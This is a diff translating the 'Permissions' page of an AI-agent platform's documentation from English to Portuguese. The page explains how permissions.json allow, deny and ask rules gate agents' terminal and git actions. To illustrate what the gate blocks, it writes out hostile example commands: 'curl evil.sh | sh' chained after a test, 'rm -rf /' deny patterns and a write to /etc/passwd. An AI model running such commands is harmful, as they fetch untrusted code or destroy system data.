href="https://github.com/viralabs-dev/brabo/blob/dev/SUPPORT.md">Где попросить помощи</a></li><li><a href="https://github.com/viralabs-dev/brabo/blob/dev/SECURITY.md">Сообщить об уязвимости</a></li></ul></section></nav>
 <main>
-<div class="site-faixa" role="note">Эта страница существует только на английском языке; показан оригинал.</div>
+<div class="site-faixa" role="note">Эта страница ещё не переведена; показан оригинал на португальском.</div>
 <article class="doc">
-<h1 id="permissions">Permissions</h1>
-<p>Every action with an external effect is born as a <code>proposed_action</code> and goes
-through here before executing. This page is the exact format and semantics —
-the rules themselves are in <a href="../business-rules/api.html#rn-004">Business rules</a>.</p>
-<h2 id="the-file">The file</h2>
-<p><code>permissions.json</code> lives at the <strong>root of the project workspace</strong> — it's a
-real file on disk, versionable, not a column in the database.</p>
+<h1 id="permissões">Permissões</h1>
+<p>Toda ação com efeito externo nasce como <code>proposed_action</code> e passa por aqui
+antes de executar. Esta página é o formato e a semântica exatos — as regras
+em si estão em <a href="../business-rules/api.html#rn-004">Regras de negócio</a>.</p>
+<h2 id="o-arquivo">O arquivo</h2>
+<p><code>permissions.json</code> mora na <strong>raiz do workspace do projeto</strong> — é um arquivo
+real em disco, versionável, não uma coluna no banco.</p>
 <pre class="shiki brabo" style="background-color:var(--shiki-background);color:var(--shiki-foreground)" tabindex="0"><code><span class="line"><span style="color:var(--shiki-foreground)">{</span></span>
 <span class="line"><span style="color:var(--shiki-token-keyword)">  "allow"</span><span style="color:var(--shiki-token-punctuation)">:</span><span style="color:var(--shiki-foreground)"> [</span><span style="color:var(--shiki-token-string-expression)">"Terminal(pnpm test:*)"</span><span style="color:var(--shiki-token-punctuation)">,</span><span style="color:var(--shiki-token-string-expression)"> "Terminal(git status)"</span><span style="color:var(--shiki-foreground)">]</span><span style="color:var(--shiki-token-punctuation)">,</span></span>
 <span class="line"><span style="color:var(--shiki-token-keyword)">  "deny"</span><span style="color:var(--shiki-token-punctuation)">:</span><span style="color:var(--shiki-foreground)">  [</span><span style="color:var(--shiki-token-string-expression)">"Terminal(curl:*)"</span><span style="color:var(--shiki-foreground)">]</span><span style="color:var(--shiki-token-punctuation)">,</span></span>
 <span class="line"><span style="color:var(--shiki-token-keyword)">  "ask"</span><span style="color:var(--shiki-token-punctuation)">:</span><span style="color:var(--shiki-foreground)">   [</span><span style="color:var(--shiki-token-string-expression)">"GitPush()"</span><span style="color:var(--shiki-foreground)">]</span></span>
 <span class="line"><span style="color:var(--shiki-foreground)">}</span></span>
 <span class="line"></span></code></pre>
-<p>Three lists, three meanings:</p>
+<p>Três listas, três significados:</p>
 <div class="tabela-rolavel"><table>
 <thead>
 <tr>
-<th>list</th>
-<th>meaning</th>
+<th>lista</th>
+<th>significado</th>
 </tr>
 </thead>
 <tbody>
 <tr>
 <td><code>allow</code></td>
-<td><code>auto_approve</code> — the action executes without asking</td>
+<td><code>auto_approve</code> — a ação executa sem perguntar</td>
 </tr>
 <tr>
 <td><code>deny</code></td>
-<td><code>deny</code> — refused, and nothing reverts this</td>
+<td><code>deny</code> — recusada, e nada reverte isso</td>
 </tr>
 <tr>
 <td><code>ask</code></td>
-<td><code>require_approval</code> — goes to the approval queue</td>
+<td><code>require_approval</code> — vai para a fila de aprovação</td>
 </tr>
 </tbody>
 </table></div>
-<p>No list matches? The action stays <code>pending</code> by default. <strong>The absence of a
-rule never becomes a permission.</strong></p>
-<h3 id="with-which-credential-the-auto-approved-action-executes">With which credential the auto-approved action executes</h3>
-<p><code>auto_approve</code> means <strong>nobody decided</strong> — <code>proposed_actions.decided_by</code>
-stays <code>NULL</code>. This matters for who executes: a git action against a remote
-provider needs a token, and &quot;the token of whoever decided&quot; doesn't exist on
-this path.</p>
-<p>The answer is the <strong>workspace owner</strong> (<a href="../business-rules/api.html#rn-082">RN-082</a>),
-the same one as the LLM key (<a href="../business-rules/api.html#rn-058">RN-058</a>) —
-whoever funds the account funds the agents, and that doesn't change based on
-who clicks.</p>
-<p>It's worth knowing because the alternative fails silently: while the api
-resolved by <code>decided_by</code>, <strong>every auto-approved PR on a remote repository
-died</strong> with <code>Requires authentication</code>, and only when a human clicked each
-one did the path work — exactly the ladder that autonomy exists to avoid.</p>
-<h2 id="the-pattern-format">The pattern format</h2>
+<p>Nenhuma lista casa? A ação fica <code>pending</code> por padrão. <strong>A ausência de regra
+nunca vira permissão.</strong></p>
+<h3 id="com-qual-credencial-a-ação-auto-aprovada-executa">Com qual credencial a ação auto-aprovada executa</h3>
+<p><code>auto_approve</code> quer dizer que <strong>ninguém decidiu</strong> —
+<code>proposed_actions.decided_by</code> fica <code>NULL</code>. Isso importa para quem executa:
+uma ação de git contra um provider remoto precisa de um token, e &quot;o token de
+quem decidiu&quot; não existe neste caminho.</p>
+<p>A resposta é o <strong>owner do workspace</strong> (<a href="../business-rules/api.html#rn-082">RN-082</a>),
+o mesmo da chave de LLM (<a href="../business-rules/api.html#rn-058">RN-058</a>) — quem
+financia a conta financia os agentes, e isso não muda conforme quem clica.</p>
+<p>Vale saber porque a alternativa falha calada: enquanto a api resolvia por
+<code>decided_by</code>, <strong>toda PR auto-aprovada em repositório remoto morria</strong> com
+<code>Requires authentication</code>, e só quando um humano clicava em cada uma o
+caminho funcionava — exatamente a escada que a autonomia existe para evitar.</p>
+<h2 id="o-formato-do-padrão">O formato do padrão</h2>
 <pre class="codigo"><code>Label(content)
 </code></pre>
-<p>The label is the action type in PascalCase. The content is only used for
-<code>Terminal</code>; in the other types it needs to be <strong>empty</strong> — <code>GitPush()</code>
-matches any push, and <code>GitPush(algo)</code> matches nothing.</p>
+<p>O rótulo é o tipo de ação em PascalCase. O conteúdo só é usado em
+<code>Terminal</code>; nos outros tipos ele precisa ser <strong>vazio</strong> — <code>GitPush()</code> casa com
+qualquer push, e <code>GitPush(algo)</code> não casa com nada.</p>
 <div class="tabela-rolavel"><table>
 <thead>
 <tr>
-<th>action type</th>
-<th>label</th>
-<th>minimum role</th>
+<th>tipo de ação</th>
+<th>rótulo</th>
+<th>papel mínimo</th>
 </tr>
 </thead>
 <tbody>
@@ -193,93 +192,91 @@ matches any push, and <code>GitPush(algo)</code> matches nothing.</p>
 </tr>
 </tbody>
 </table></div>
-<p>The minimum role is checked <strong>before</strong> the file. Without it, <code>deny</code> —
-<code>permissions.json</code> cannot grant what IAM denies</p>
-<p><code>parallelize</code> (Phase 14d) is the only one whose effect isn't touching code
-or repository: it requests more AGENTS. It's at <code>maintainer</code> for the same
-reason as <code>spend</code> — whoever authorizes cost is whoever is accountable for
-the project. It only exists above the lead's cap; within it there's no
-action, because there's nothing to decide
+<p>O papel mínimo é conferido <strong>antes</strong> do arquivo. Sem ele, <code>deny</code> — o
+<code>permissions.json</code> não concede o que o IAM nega</p>
+<p><code>parallelize</code> (Fase 14d) é o único cujo efeito não é tocar código ou
+repositório: ele pede mais AGENTES. Está em <code>maintainer</code> pelo mesmo motivo de
+<code>spend</code> — quem autoriza custo é quem responde pelo projeto. Ele só existe
+acima do teto do lead; dentro dele não há ação, porque não há nada a decidir
 (<a href="../business-rules/api.html#rn-083">RN-083</a>)
 (<a href="../business-rules/api.html#rn-005">RN-005</a>).</p>
 <p><code>propose_execution_plan</code> (ADR 0086, <a href="../business-rules/engine.html#rn-284">RN-284</a>)
-is the Dev Lead's plan — how many agents per module and why, before any of
-them come up. Same caliber as <code>parallelize</code>: a decision about HOW MUCH the
-product will spend on parallelism, just at the start instead of at a cap
-overrun. Unlike <code>parallelize</code>/<code>raise_max_parallel</code>, it is NOT in the
-absolute-caps block — it can be configured as <code>auto_approve</code>, like
-<code>open_adr_pr</code>/<code>open_infra_pr</code> — and while it's <code>pending</code>, the Dev Lead's
-turn stays SUSPENDED waiting for the decision, not just the conversation
-stalled.</p>
+é o plano do Dev Lead — quantos agentes por módulo e por quê, antes de
+qualquer um deles subir. Mesmo calibre de <code>parallelize</code>: uma decisão sobre
+QUANTO o produto vai gastar em paralelismo, só que no começo em vez de no
+estouro de um teto. Diferente de <code>parallelize</code>/<code>raise_max_parallel</code>, ele NÃO
+está no bloco de tetos absolutos — pode ser configurado como <code>auto_approve</code>,
+como <code>open_adr_pr</code>/<code>open_infra_pr</code> — e enquanto está <code>pending</code>, o turno do Dev
+Lead fica SUSPENSO esperando a decisão, não só a conversa parada.</p>
 <p><code>assess_implementability</code> (ADR 0090, <a href="../business-rules/api.html#rn-340">RN-340</a>)
-is the implementability assessment of a story (gate <code>implementavel</code>,
-<code>config/gates.yml</code>) — SAME caliber and SAME reasoning as
-<code>propose_execution_plan</code>: an initial session decision, not a cap overrun,
-and therefore also outside the absolute-caps block. It suspends the Dev
-Lead's turn the same way while <code>pending</code>.</p>
-<p><code>container_stop</code> and <code>container_remove</code> (ADR 0136,
-<a href="../business-rules/api.html#rn-495">RN-495</a>) are the two actions the global
-containers page (<code>/containers</code>) proposes when someone clicks &quot;Stop&quot; or
-&quot;Remove&quot; on a project's row — always a human, never an agent. Both are
-<code>maintainer</code>, same as <code>container_start</code>: whoever is accountable for the
-project's infra decides. <code>container_stop</code> follows <code>container_start</code>'s
-calibration — it CAN be configured <code>auto_approve</code> — except for the seed:
-<code>container_stop</code> is never seeded, while <code>container_start</code> is seeded
-<code>auto_approve</code> for the Infra agent when its handoff is accepted (ADR 0190,
-<a href="../business-rules/api.html#rn-671">RN-671</a>). That seed is what lets the start the
-Infra Lead's SERVER proposes on that accept run without a second click; the
-<code>maintainer</code> minimum, the mode/state refusals and the no-broker 409 all still
-apply before it.
-<code>container_remove</code> cannot: it discards the container and forces a full
-reprovision, and is in the absolute-caps block below, same treatment as
-external-effect git/privileged commands.</p>
-<p><strong>None of the three cares WHERE the container comes up.</strong> <code>decide()</code> and
-every rule above are agnostic of <code>executionMode</code> — the branch only exists
-in EXECUTION, after approval (<code>ExecuteContainerStartUseCase</code>/
-<code>ExecuteContainerStopUseCase</code>/<code>ExecuteContainerRemoveUseCase</code>): a
-<code>container</code> project's approved action still goes to the broker
-(<code>ContainerBrokerPort</code>, unchanged); a <code>mounted</code>/<code>runner</code> project's goes to
-the RUNNER connected to the project instead, over the Phoenix channel it
-already keeps (<a href="../business-rules/produto.html#rn-497">RN-497</a>,
-<a href="../adr/0137-o-runner-sobe-o-container-do-projeto.html">ADR 0137</a>). &quot;No
-runner connected&quot; and &quot;the runner tried and refused&quot; are both ordinary
-<code>failed</code> outcomes, same discipline as a broker refusal — never an
-uncaught exception.</p>
-<p><strong>One more thing happens in <code>container_start</code> execution, and only for
+é a avaliação de implementabilidade de uma história (gate <code>implementavel</code>,
+<code>config/gates.yml</code>) — MESMO calibre e MESMO raciocínio de
+<code>propose_execution_plan</code>: uma decisão inicial da sessão, não um estouro de
+teto, e por isso também fora do bloco de tetos absolutos. Ela suspende o turno
+do Dev Lead do mesmo jeito enquanto está <code>pending</code>.</p>
+<p><code>container_stop</code> e <code>container_remove</code> (ADR 0136,
+<a href="../business-rules/api.html#rn-495">RN-495</a>) são as duas ações que a página global
+de containers (<code>/containers</code>) propõe quando alguém clica em &quot;Parar&quot; ou
+&quot;Remover&quot; na linha de um projeto — sempre um humano, nunca um agente. As duas
+são <code>maintainer</code>, como <code>container_start</code>: decide quem responde pela infra do
+projeto. <code>container_stop</code> segue a calibragem de <code>container_start</code> — PODE ser
+configurada <code>auto_approve</code> — exceto pela semeadura: <code>container_stop</code> nunca é
+semeada, enquanto <code>container_start</code> é semeada <code>auto_approve</code> para o agente de
+Infra quando o handoff dele é aceito (ADR 0190,
+<a href="../business-rules/api.html#rn-671">RN-671</a>). É essa semeadura que deixa a subida
+que o SERVIDOR do Infra Lead propõe nesse aceite rodar sem um segundo clique;
+o mínimo <code>maintainer</code>, as recusas por modo/estado e o 409 sem broker continuam
+valendo antes dela.
+<code>container_remove</code> não pode: ela descarta o container e força um
+reprovisionamento completo, e está no bloco de tetos absolutos abaixo, mesmo
+tratamento de git com efeito externo/comandos privilegiados.</p>
+<p><strong>Nenhuma das três se importa com ONDE o container sobe.</strong> <code>decide()</code> e todas
+as regras acima ignoram o <code>executionMode</code> — a ramificação só existe na
+EXECUÇÃO, depois da aprovação (<code>ExecuteContainerStartUseCase</code>/
+<code>ExecuteContainerStopUseCase</code>/<code>ExecuteContainerRemoveUseCase</code>): a ação
+aprovada de um projeto <code>container</code> continua indo para o broker
+(<code>ContainerBrokerPort</code>, sem mudança); a de um projeto <code>mounted</code>/<code>runner</code> vai,
+em vez disso, para o RUNNER conectado ao projeto, pelo canal Phoenix que ele
+já mantém (<a href="../business-rules/produto.html#rn-497">RN-497</a>,
+<a href="../adr/0137-o-runner-sobe-o-container-do-projeto.html">ADR 0137</a>). &quot;Nenhum
+runner conectado&quot; e &quot;o runner tentou e recusou&quot; são os dois desfechos <code>failed</code>
+comuns, mesma disciplina de uma recusa do broker — nunca uma exceção não
+tratada.</p>
+<p><strong>Mais uma coisa acontece na execução de <code>container_start</code>, e só em
 <code>mounted</code></strong> (<a href="../business-rules/api.html#rn-501">RN-501</a>,
-<a href="../adr/0142-validacao-de-workspace-montado-adiada.html">ADR 0142</a>): the
-project's folder is MATERIALIZED there. Creating a <code>mounted</code> project no
-longer requires the folder to exist — creation validates only the path
-format plus <code>BRABO_PROJECTS_BASE</code> — because the product owner's requirement
-is that the bind-mount be created AFTER the architect's decision, and
-<code>container_start</code> is the first moment that qualifies. So the executor
-<code>mkdir -p</code>s the folder, proves it writable from inside the api, and stamps
-<code>workspace_verified_at</code>, all BEFORE any lifecycle transition. A folder the
-api cannot create or reach is a NAMED <code>failed</code> — it names the variable, the
-path, the likely cause (folder ownership on the host; images run non-root,
-ADR 0024) and the next step — and the lifecycle row is <strong>not</strong> marked
-<code>provisioning</code>: marking it and only then finding out you cannot write would
-leave <code>project_containers</code> asserting a state that never existed. None of
-this touches <code>decide()</code>, the caps, or who may approve.</p>
-<p><strong>And <code>container_start</code> resolves its resources there</strong>
+<a href="../adr/0142-validacao-de-workspace-montado-adiada.html">ADR 0142</a>): a pasta do
+projeto é MATERIALIZADA ali. Criar um projeto <code>mounted</code> não exige mais que a
+pasta exista — a criação valida só o formato do caminho mais a
+<code>BRABO_PROJECTS_BASE</code> — porque o requisito do dono do produto é que o
+bind-mount seja criado DEPOIS da decisão do Arquiteto, e <code>container_start</code> é o
+primeiro momento que se qualifica. Então o executor faz <code>mkdir -p</code> da pasta,
+prova que ela é gravável de dentro da api e carimba <code>workspace_verified_at</code>,
+tudo ANTES de qualquer transição de ciclo de vida. Uma pasta que a api não
+consegue criar ou alcançar é um <code>failed</code> NOMEADO — nomeia a variável, o
+caminho, a causa provável (dono da pasta no host; as imagens rodam
+non-root, ADR 0024) e o próximo passo — e a linha do ciclo de vida <strong>não</strong> é
+marcada <code>provisioning</code>: marcá-la e só então descobrir que não dá para escrever
+deixaria <code>project_containers</code> afirmando um estado que nunca existiu. Nada disso
+toca <code>decide()</code>, os tetos ou quem pode aprovar.</p>
+<p><strong>E <code>container_start</code> resolve os recursos dele ali</strong>
 (<a href="../business-rules/api.html#rn-683">RN-683</a>,
-<a href="../adr/0199-recurso-minimo-derivado-do-module-map.html">ADR 0199</a>): a field
-the proposal OMITS — every field, in the server's start on handoff acceptance
-— becomes the MINIMUM derived from the current <code>module_map</code> (the sum of what
-each module declared, floored at today's default while any module declared
-nothing); a field BELOW that minimum is a named <code>failed</code>, recorded before any
-image decision or lifecycle transition; above it, the usual ceiling applies.
-Like the folder materialization, this is execution, not policy: <code>decide()</code>
-and who may approve do not change.</p>
-<h2 id="how-a-pattern-matches-a-command">How a pattern matches a command</h2>
-<p>Not by substring. The command is tokenized with shell rules and the pattern
-matches by <strong>token prefix</strong>:</p>
+<a href="../adr/0199-recurso-minimo-derivado-do-module-map.html">ADR 0199</a>): um campo
+que a proposta OMITE — todos, na subida do servidor no aceite do handoff —
+vira o MÍNIMO derivado do <code>module_map</code> vigente (a soma do que cada módulo
+declarou, com piso no padrão de hoje enquanto algum módulo não declarou nada);
+um campo ABAIXO desse mínimo é um <code>failed</code> nomeado, gravado antes de qualquer
+decisão de imagem ou transição de ciclo de vida; acima dele, vale o teto de
+sempre. Como a materialização da pasta, isto é execução, não política:
+<code>decide()</code> e quem pode aprovar não mudam.</p>
+<h2 id="como-um-padrão-casa-com-um-comando">Como um padrão casa com um comando</h2>
+<p>Não por substring. O comando é tokenizado com as regras do shell e o padrão
+casa por <strong>prefixo de token</strong>:</p>
 <div class="tabela-rolavel"><table>
 <thead>
 <tr>
-<th>pattern</th>
-<th>command</th>
-<th>matches?</th>
+<th>padrão</th>
+<th>comando</th>
+<th>casa?</th>
 </tr>
 </thead>
 <tbody>
@@ -291,7 +288,7 @@ matches by <strong>token prefix</strong>:</p>
 <tr>
 <td><code>Terminal(pnpm test)</code></td>
 <td><code>pnpm test --watch</code></td>
-<td>✅ (prefix)</td>
+<td>✅ (prefixo)</td>
 </tr>
 <tr>
 <td><code>Terminal(pnpm test)</code></td>
@@ -301,554 +298,540 @@ matches by <strong>token prefix</strong>:</p>
 <tr>
 <td><code>Terminal(pnpm test:*)</code></td>
 <td><code>pnpm test:unit</code></td>
-<td>✅ (<code>*</code> at the end of the token)</td>
+<td>✅ (<code>*</code> no fim do token)</td>
 </tr>
 <tr>
 <td><code>Terminal(rm)</code></td>
 <td><code>sudo rm -rf x</code></td>
-<td>❌ — <code>rm</code> is not the first token</td>
+<td>❌ — <code>rm</code> não é o primeiro token</td>
 </tr>
 </tbody>
 </table></div>
-<p>The <code>*</code> applies <strong>inside a token</strong>, at the end. It's not a path glob:
-<code>Terminal(rm -rf /*)</code> matches the literal token <code>/*</code>, not &quot;anything under
-<code>/</code>&quot;.</p>
-<p>Environment variables are preserved literally: <code>$HOME</code> stays <code>$HOME</code> in the
-match, instead of expanding to empty — expanding would silently change what
-is being compared.</p>
-<h2 id="compound-command">Compound command</h2>
-<p>A command with <code>&amp;&amp;</code>, <code>;</code>, <code>|</code>, <code>||</code> or <code>&amp;</code> is split into segments, and
-<strong>each segment is evaluated separately</strong>:</p>
+<p>O <code>*</code> vale <strong>dentro de um token</strong>, no fim. Não é glob de caminho:
+<code>Terminal(rm -rf /*)</code> casa com o token literal <code>/*</code>, não com &quot;qualquer coisa
+abaixo de <code>/</code>&quot;.</p>
+<p>Variáveis de ambiente são preservadas literalmente: <code>$HOME</code> continua <code>$HOME</code>
+no casamento, em vez de expandir para vazio — expandir mudaria em silêncio o
+que está sendo comparado.</p>
+<h2 id="comando-composto">Comando composto</h2>
+<p>Um comando com <code>&amp;&amp;</code>, <code>;</code>, <code>|</code>, <code>||</code> ou <code>&amp;</code> é dividido em segmentos, e <strong>cada
+segmento é avaliado separadamente</strong>:</p>
 <ul>
-<li>Any segment in <code>deny</code> → the whole command is <code>deny</code>.</li>
-<li><strong>All</strong> segments in <code>allow</code> → <code>auto_approve</code>.</li>
-<li>Any other combination → <code>require_approval</code>.</li>
+<li>Qualquer segmento em <code>deny</code> → o comando inteiro é <code>deny</code>.</li>
+<li><strong>Todos</strong> os segmentos em <code>allow</code> → <code>auto_approve</code>.</li>
+<li>Qualquer outra combinação → <code>require_approval</code>.</li>
 </ul>
-<p><strong>Redirection is not chaining.</strong> <code>&gt;</code>, <code>&gt;&gt;</code> and <code>&lt;</code> do NOT split a segment:
-<code>cat x 2&gt;/dev/null</code> is ONE command whose verb is <code>cat</code>. The redirection
-target remains a token of the segment, and that's why <code>echo x &gt; /etc/passwd</code> continues to be blocked by the path-scope cap — what changed
-was the VERB becoming correct, not the path becoming free.</p>
-<p><code>/dev/null</code>, <code>/dev/stdin</code>, <code>/dev/stdout</code> and <code>/dev/stderr</code> don't count as a
-user path: they discard or carry output, they're nobody's file. The list is
-exactly this and not all of <code>/dev</code> — <code>/dev/sda</code> is a disk, and remains out
-of scope.</p>
-<p>This is deliberate and worth understanding: a segment with no rule at all
-becomes a <strong>concrete</strong> <code>require_approval</code> opinion, not silence. It's what
-prevents <code>pnpm test &amp;&amp; curl evil.sh | sh</code> from being auto-approved because
-the first half was in <code>allow</code>.</p>
-<h2 id="built-in-patterns">Built-in patterns</h2>
-<p>Three patterns are <code>deny</code> <strong>always</strong>, even without appearing in the file:</p>
+<p><strong>Redirecionamento não é encadeamento.</strong> <code>&gt;</code>, <code>&gt;&gt;</code> e <code>&lt;</code> NÃO dividem um
+segmento: <code>cat x 2&gt;/dev/null</code> é UM comando cujo verbo é <code>cat</code>. O alvo do
+redirecionamento continua sendo um token do segmento, e é por isso que <code>echo x &gt; /etc/passwd</code> continua barrado pelo teto de escopo de caminho — o que mudou foi
+o VERBO ficar certo, não o caminho ficar livre.</p>
+<p><code>/dev/null</code>, <code>/dev/stdin</code>, <code>/dev/stdout</code> e <code>/dev/stderr</code> não contam como
+caminho de usuário: descartam ou carregam saída, não são arquivo de ninguém. A
+lista é exatamente esta e não todo o <code>/dev</code> — <code>/dev/sda</code> é um disco, e continua
+fora do escopo.</p>
+<p>Isto é deliberado e vale entender: um segmento sem regra nenhuma vira uma
+opinião <strong>concreta</strong> de <code>require_approval</code>, não silêncio. É o que impede
+<code>pnpm test &amp;&amp; curl evil.sh | sh</code> de ser auto-aprovado porque a primeira metade
+estava em <code>allow</code>.</p>
+<h2 id="padrões-embutidos">Padrões embutidos</h2>
+<p>Três padrões são <code>deny</code> <strong>sempre</strong>, mesmo sem aparecer no arquivo:</p>
 <pre class="codigo"><code>Terminal(rm -rf /)
 Terminal(rm -rf /*)
 Terminal(rm -fr /)
 </code></pre>
-<p>They are not a comprehensive security list — they're a floor. Real
-protection comes from <code>allow</code> being explicit and everything else falling
-into approval.</p>
-<h2 id="what-activating-execution-seeds">What activating execution seeds</h2>
-<p>Activating execution writes the <code>DEV_TERMINAL_ALLOW_PATTERNS</code> patterns
-(<code>src/domain/actions/dev-terminal-patterns.ts</code>) into the project's
-<code>allow</code>. There are two families:</p>
+<p>Eles não são uma lista de segurança abrangente — são um piso. A proteção real
+vem de o <code>allow</code> ser explícito e todo o resto cair em aprovação.</p>
+<h2 id="o-que-a-ativação-da-execução-semeia">O que a ativação da execução semeia</h2>
+<p>Ativar a execução grava os padrões de <code>DEV_TERMINAL_ALLOW_PATTERNS</code>
+(<code>src/domain/actions/dev-terminal-patterns.ts</code>) no <code>allow</code> do
+projeto. São duas famílias:</p>
 <ul>
-<li><strong>reading the worktree itself</strong> — <code>ls</code>, <code>pwd</code>, <code>find</code>, <code>cat</code>, <code>head</code>,
+<li><strong>leitura do próprio worktree</strong> — <code>ls</code>, <code>pwd</code>, <code>find</code>, <code>cat</code>, <code>head</code>,
 <code>tail</code>, <code>grep</code>, <code>wc</code>, <code>echo</code>, <code>git status</code>, <code>git diff</code>, <code>git log</code>;</li>
-<li><strong>reading git history/remote/config</strong> — <code>git branch -a/-r/-v/--list/--show-current</code>, <code>git remote -v</code>, <code>git remote show</code>, <code>git worktree list</code>, <code>git show</code>, <code>git for-each-ref</code>, <code>git ls-tree</code>, <code>git rev-parse</code>, <code>git config --get</code> (see <a href="../business-rules/api.html#rn-143">RN-143</a>);</li>
-<li><strong>build and test</strong> — <code>pnpm install</code>, <code>pnpm test</code>, <code>npm run</code>, <code>npx vitest</code>, <code>mix test</code>, <code>pytest</code>, <code>go test</code>, <code>cargo test</code>, among others.</li>
+<li><strong>leitura de histórico/remoto/config do git</strong> — <code>git branch -a/-r/-v/--list/--show-current</code>, <code>git remote -v</code>, <code>git remote show</code>, <code>git worktree list</code>, <code>git show</code>, <code>git for-each-ref</code>, <code>git ls-tree</code>, <code>git rev-parse</code>, <code>git config --get</code> (veja a <a href="../business-rules/api.html#rn-143">RN-143</a>);</li>
+<li><strong>build e teste</strong> — <code>pnpm install</code>, <code>pnpm test</code>, <code>npm run</code>, <code>npx vitest</code>, <code>mix test</code>, <code>pytest</code>, <code>go test</code>, <code>cargo test</code>, entre outros.</li>
 </ul>
-<p>The third family exists because <code>ReportDone</code> only allows opening a PR after
-a <code>terminal</code> with <code>exit 0</code> in the history. The first exists because the
-agent <strong>looks before it builds</strong>: without it, every <code>ls -la</code> in a newly
-provisioned repository fell into approval, came back as <code>status pending</code> —
-and not as the command's output — and burned a ToolLoop iteration until the
-task died by limit (see <a href="../business-rules/api.html#rn-068">RN-068</a>). The second
-exists because <code>git status</code>/<code>diff</code>/<code>log</code> are enough to look at the
-worktree, but not for the agent to orient itself in the history and remotes
-of a newly adopted repository — a real session spent dozens of manual
-approvals on subcommands like <code>git branch -a</code> or <code>git worktree list</code> that
-fell outside <code>allow</code> and pushed to manual approval any compound command
-they appeared in.</p>
-<p>This does NOT loosen anything described above. It still holds that <code>deny</code>
-beats <code>allow</code>, that the built-in patterns remain active, that matching is
-by <strong>token</strong> prefix (<code>ls</code> allowed doesn't allow <code>lsof</code>), and that a
-compound command requires EVERY segment to match — so <code>ls &amp;&amp; rm -rf /</code>
-doesn't pass because of the <code>ls</code>.</p>
-<p>The second family requires extra care, because prefix matching allows
-ANYTHING after the prefix that matched: a bare pattern <code>Terminal(git branch)</code> would match both <code>git branch -D nome</code> (deletes) and <code>git branch nome-nova</code> (creates) as well as the plain listing, because it can't see
-what comes after. That's why <code>branch</code>, <code>remote</code>, <code>worktree</code> and <code>config</code> —
-the four that have a MUTATING sibling — only got in ANCHORED by the flag
-that makes the read unambiguous (<code>-a</code>/<code>-v</code>/<code>show</code>/<code>list</code>/<code>--get</code>), never by
-the bare verb; <code>git branch -D/-d/-m/-M</code>, <code>git remote add/remove/set-url</code>,
-<code>git worktree add/remove/prune</code> and <code>git config &lt;chave&gt; &lt;valor&gt;</code> (without
-<code>--get</code>) still require approval. <code>show</code>, <code>log</code>, <code>for-each-ref</code>, <code>ls-tree</code>
-and <code>rev-parse</code> didn't need an anchor: none of their continuations mutate
-the repository.</p>
-<p>Auto-approving <code>terminal</code> via <code>agent_autonomy</code> would be different and is
-not what's done: it would free up ANY command inside the engine container,
-with no file in the middle.</p>
-<h2 id="the-complete-decision-order">The complete decision order</h2>
+<p>A terceira família existe porque o <code>ReportDone</code> só deixa abrir PR depois de um
+<code>terminal</code> com <code>exit 0</code> no histórico. A primeira existe porque o agente
+<strong>olha antes de construir</strong>: sem ela, todo <code>ls -la</code> num repositório recém
+provisionado caía em aprovação, voltava como <code>status pending</code> — e não como a
+saída do comando — e queimava uma iteração do ToolLoop até a tarefa morrer por
+limite (veja a <a href="../business-rules/api.html#rn-068">RN-068</a>). A segunda existe
+porque <code>git status</code>/<code>diff</code>/<code>log</code> bastam para olhar o worktree, mas não para o
+agente se orientar no histórico e nos remotos de um repositório recém adotado
+— uma sessão real gastou dezenas de aprovações manuais em subcomandos como
+<code>git branch -a</code> ou <code>git worktree list</code> que ficavam fora do <code>allow</code> e
+empurravam para aprovação manual todo comando composto em que apareciam.</p>
+<p>Isto NÃO afrouxa nada do que está descrito acima. Continua valendo que <code>deny</code>
+vence <code>allow</code>, que os padrões embutidos seguem ativos, que o casamento é por
+prefixo de <strong>token</strong> (<code>ls</code> permitido não permite <code>lsof</code>), e que um comando
+composto exige que TODO segmento case — então <code>ls &amp;&amp; rm -rf /</code> não passa por
+causa do <code>ls</code>.</p>
+<p>A segunda família exige cuidado a mais, porque o casamento por prefixo permite
+QUALQUER coisa depois do prefixo que casou: um padrão nu <code>Terminal(git branch)</code> casaria tanto com <code>git branch -D nome</code> (apaga) quanto com <code>git branch nome-nova</code> (cria) além da listagem simples, porque não enxerga o que vem
+depois. Por isso <code>branch</code>, <code>remote</code>, <code>worktree</code> e <code>config</code> — os quatro que têm
+um irmão que MUTA — só entraram ANCORADOS pela flag que torna a leitura
+inequívoca (<code>-a</code>/<code>-v</code>/<code>show</code>/<code>list</code>/<code>--get</code>), nunca pelo verbo nu;
+<code>git branch -D/-d/-m/-M</code>, <code>git remote add/remove/set-url</code>,
+<code>git worktree add/remove/prune</code> e <code>git config &lt;chave&gt; &lt;valor&gt;</code> (sem <code>--get</code>)
+continuam exigindo aprovação. <code>show</code>, <code>log</code>, <code>for-each-ref</code>, <code>ls-tree</code> e
+<code>rev-parse</code> não precisaram de âncora: nenhuma continuação deles muta o
+repositório.</p>
+<p>Auto-aprovar <code>terminal</code> via <code>agent_autonomy</code> seria diferente e não é o que se
+faz: liberaria QUALQUER comando dentro do container do engine, sem arquivo no
+meio.</p>
+<h2 id="a-ordem-completa-da-decisão">A ordem completa da decisão</h2>
 <pre class="mermaid" data-mermaid>flowchart TD
-  A[proposed_action] --&gt; B{role &gt;= minimum?}
-  B --&gt;|no| D1[deny: insufficient IAM]
-  B --&gt;|yes| C0{terminal, and project's&lt;br/&gt;real container running?}
-  C0 --&gt;|yes| C1[base: auto_approve — RN-492/493]
-  C0 --&gt;|no| C[base: require_approval]
-  C1 --&gt; D{agent_autonomy has an opinion?}
+  A[proposed_action] --&gt; B{papel &gt;= mínimo?}
+  B --&gt;|não| D1[deny: IAM insuficiente]
+  B --&gt;|sim| C0{terminal, e o container real&lt;br/&gt;do projeto running?}
+  C0 --&gt;|sim| C1[base: auto_approve — RN-492/493]
+  C0 --&gt;|não| C[base: require_approval]
+  C1 --&gt; D{agent_autonomy tem opinião?}
   C --&gt; D
   D --&gt;|deny| D2[deny]
-  D --&gt;|other| E[adopts the opinion]
-  D --&gt;|none| E2[keeps the base]
-  E --&gt; F{permissions.json matches?}
+  D --&gt;|outra| E[adota a opinião]
+  D --&gt;|nenhuma| E2[mantém a base]
+  E --&gt; F{permissions.json casa?}
   E2 --&gt; F
   F --&gt;|deny| D3[deny]
-  F --&gt;|allow/ask| G[adopts the file's verdict]
-  F --&gt;|none| G2[keeps the previous]
-  G --&gt; S{terminal touches path&lt;br/&gt;outside the project folder?}
+  F --&gt;|allow/ask| G[adota o veredito do arquivo]
+  F --&gt;|nenhum| G2[mantém o anterior]
